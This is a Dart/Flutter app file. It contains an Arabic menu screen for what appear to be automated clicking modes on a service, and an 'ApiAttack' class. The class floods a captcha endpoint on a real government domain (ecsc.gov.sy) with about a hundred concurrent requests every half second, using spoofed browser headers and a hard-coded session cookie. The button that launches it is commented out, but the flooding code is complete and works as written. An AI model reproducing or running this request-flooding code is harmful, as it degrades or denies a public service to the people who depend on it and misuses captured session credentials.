

import 'package:dio/dio.dart';
import 'package:flutter/material.dart';
import '../login_accounts/login_accounts.dart';
import '../mobile/home/home.dart';
import '../settings/settings.dart';
import '../time/select_one_time_screen.dart';
import '../time/select_time screen.dart';
import '../work/manual_work.dart';
import 'dart:async';



class SelectWorkType extends StatefulWidget {
  const SelectWorkType({super.key});

  @override
  State<SelectWorkType> createState() => _SelectWorkTypeState();
}

class _SelectWorkTypeState extends State<SelectWorkType> {


  @override
  Widget build(BuildContext context) {
    return Scaffold(
      appBar: AppBar(
        title: const Text('اختر نوع العمل'),
        centerTitle: true,
      ),
      body: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          SizedBox(width: MediaQuery.of(context).size.width,),
          ElevatedButton(
            onPressed: () async {
              Navigator.push(context, MaterialPageRoute(builder: (context)=> const SelectAutoTimesScreen()));
            },
            child: const Text('نقر تلقائي'),
          ),
          const SizedBox(height: 20,),
          ElevatedButton(
            onPressed: () async {
              Navigator.push(context, MaterialPageRoute(builder: (context)=> const ManualScreen()));
            },
            child: const Text('نقر يدوي'),
          ),
          const SizedBox(height: 20,),
          ElevatedButton(
            onPressed: () async {
              Navigator.push(context, MaterialPageRoute(builder: (context)=> const SelectOneTimeScreen()));
            },
            child: const Text('الحرق'),
          ),
          const SizedBox(height: 20,),
          ElevatedButton(
            onPressed: () async {
              Navigator.push(context, MaterialPageRoute(builder: (context)=> const HomeScreen()));
            },
            child: const Text('موبايل'),
          ),
          const SizedBox(height: 20,),
          // ElevatedButton(
          //   onPressed: () async {
          //     ApiAttack().runAttack();
          //   },
          //   child: const Text('كشاف'),
          // ),
          const SizedBox(height: 20,),
        ],
      ),
      floatingActionButton: FloatingActionButton(
        onPressed: () async {
          await SettingsData.logout();
          Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const LoginPhonePasswordScreen()));
        },
        backgroundColor: Colors.red,
        child: const Icon(
          Icons.exit_to_app_outlined,
          color: Colors.white,
        ),
      ),
    );
  }
}


class ApiAttack {
  static const String apiUrl = "https://api.ecsc.gov.sy:8443/files/fs/captcha/540002046";
  // static const String apiUrl = "https://api.ecsc.gov.sy:8443/files/fs/captcha/539320408";
  static const Map<String, String> headers = {
    "Accept": "*/*",
    "Access-Control-Request-Method": "GET",
    "Access-Control-Request-Headers": "source",
    "Origin": "https://ecsc.gov.sy",
    "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-site",
    "Sec-Fetch-Dest": "empty",
    "Referer": "https://ecsc.gov.sy/",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
    "Priority": "u=1, i",
    "Connection": "keep-alive",
    "Cookie": "sl-session=/gDhvWvBzp2dZyll04dTM/A==; SESSION=MDI3NzA4ZTEtMDc2Yi00YmI0LTgwMWItN2U2MTg5YmVjOWQ1"
  };

  static const int maxRetries = 1;
  static const int concurrentRequests = 10;
  static const int requestsPerConnection = 10;
  static const Duration requestDelay = Duration(milliseconds: 505);
  final Dio dio = Dio();

  Future<void> sendRequest() async {
    for (int attempt = 0; attempt <= maxRetries; attempt++) {
      try {
        Response response = await dio.request(
          apiUrl,
          options: Options(headers: headers, followRedirects: false, validateStatus: (status) => true),
        );

        if (response.statusCode == 200) {
          debugPrint("✅ Service is working");
          return;
        } else if (response.statusCode == 400) {
          debugPrint("❌ 400 detected, logging it...");
        } else {
          debugPrint("⚠️ Service returned ${response.statusCode}");
        }
      } catch (e) {
        debugPrint("⚠️ Request failed (Attempt ${attempt + 1})");
        await Future.delayed(const Duration(milliseconds: 100));
      }
    }
  }

  void runAttack() {
    for (int i = 0; i < concurrentRequests; i++) {
      Timer.periodic(requestDelay, (timer) {
        for (int j = 0; j < requestsPerConnection; j++) {
          sendRequest();
        }
      });
    }
  }
}





